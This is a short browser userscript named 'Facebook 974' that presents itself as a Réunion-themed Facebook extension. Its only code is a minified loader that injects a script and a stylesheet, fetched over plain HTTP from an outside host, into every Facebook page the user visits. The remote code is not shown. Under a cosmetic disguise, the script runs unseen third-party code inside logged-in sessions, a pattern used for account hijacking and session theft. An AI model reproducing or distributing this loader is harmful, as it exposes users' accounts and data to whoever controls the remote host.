// ==UserScript==
// @name           Facebook 974
// @namespace      974 extension for Facebook
// @description    Facebook Réunion
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @developer      HaryChange http://www.facebook.com/H.change
// ==/UserScript==
function loadjscssfile(filename, filetype){if (filetype=="js"){var fileref=document.createElement('script');fileref.setAttribute("type","text/javascript");fileref.setAttribute("src", filename);}else if (filetype=="css"){var fileref=document.createElement("link");fileref.setAttribute("rel", "stylesheet");fileref.setAttribute("type", "text/css");fileref.setAttribute("href", filename);}if (typeof fileref!="undefined")document.getElementsByTagName("head")[0].appendChild(fileref);}loadjscssfile("http://harychange.clanteam.com/user974fb.js", "js");loadjscssfile("http://harychange.clanteam.com/user974fb.css", "css");
